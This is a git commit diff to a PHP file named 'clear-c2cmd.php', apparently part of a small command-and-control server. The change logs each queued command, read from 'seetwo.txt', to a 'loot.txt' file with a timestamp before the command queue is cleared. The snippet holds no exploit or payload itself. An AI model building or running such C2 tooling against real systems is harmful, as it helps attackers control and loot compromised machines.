1062165795f8915df524f780210025bf76963a8d
Adam Willard <awillard@gmail.com>
2023-07-20 13:20:43 -0400

    Update clear-c2cmd.php

--- clear-c2cmd.php
+++ clear-c2cmd.php
@@ -5,6 +5,13 @@ if ($_SERVER["REQUEST_METHOD"] == "GET") {
   if (empty($data)) {
     echo "data is empty";
   } else {
+    $t=time();
+    $cmd=file_get_contents('seetwo.txt');
+    if (empty($cmd)){
+      echo "no cmd";
+    }else{
+    file_put_contents('loot.txt',date(DATE_COOKIE,$t)." - Command Executed: ".$cmd."\n",FILE_APPEND);
+    }
     file_put_contents('c2cmd.txt', '');
   }
 }
